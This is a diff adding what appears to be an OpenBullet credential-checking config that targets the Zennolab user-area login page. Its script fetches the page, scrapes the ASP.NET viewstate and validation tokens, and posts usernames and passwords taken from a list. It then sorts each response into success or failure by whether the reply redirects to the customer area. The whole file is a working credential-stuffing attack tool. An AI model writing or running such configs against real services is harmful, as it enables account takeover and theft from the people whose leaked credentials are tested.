@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "zennolab",
+  "SuggestedBots": 1,
+  "LastModified": "2019-03-23T06:04:32.7052508+01:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://userarea.zennolab.com/lk/login.aspx" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: lang=en" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+#STATE PARSE "<SOURCE>" CSS "[name=\"__VIEWSTATE\"]" "value" 0 -> VAR "STAT" "" "" 
+#GENERATOR PARSE "<SOURCE>" CSS "[name=\"__VIEWSTATEGENERATOR\"]" "value" 0 -> VAR "GEN" "" "" 
+#VALIDATION PARSE "<SOURCE>" CSS "[name=\"__EVENTVALIDATION\"]" "value" 0 -> VAR "VAL" "" "" 
+#POST REQUEST POST "https://userarea.zennolab.com/lk/login.aspx" AutoRedirect=FALSE 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=<STAT>&__VIEWSTATEGENERATOR=<GEN>&__EVENTVALIDATION=<VAL>&ctl00_ASPxComboBoxLanguage_VI=en&ctl00%24ASPxComboBoxLanguage=English&ctl00%24ASPxComboBoxLanguage%24DDDState=%7B%26quot%3BwindowsState%26quot%3B%3A%26quot%3B0%3A0%3A-1%3A0%3A0%3A0%3A-10000%3A-10000%3A1%3A0%3A0%3A0%26quot%3B%7D&ctl00%24ASPxComboBoxLanguage%24DDD%24L=en&ctl00%24ContentPlaceHolder1%24Login1%24UserName=<USER>&ctl00%24ContentPlaceHolder1%24Login1%24Password=<PASS>&ctl00%24ContentPlaceHolder1%24Login1%24ButtonHide=&DXScript=1_247%2C1_138%2C1_241%2C1_164%2C1_141%2C1_162%2C1_170%2C1_143%2C1_176%2C1_161%2C1_135%2C1_233%2C1_159%2C1_231%2C1_165&DXCss=1_9%2C1_28%2C1_31%2C1_29%2C1_10%2C1_8%2C1_23%2C1_3%2Ccss%2Fstyles.css" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://userarea.zennolab.com/lk/login.aspx" 
+  HEADER "DNT: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login page</title>" 
+  KEYCHAIN Success OR 
+    KEY "userarea/UserCustomer.aspx" 
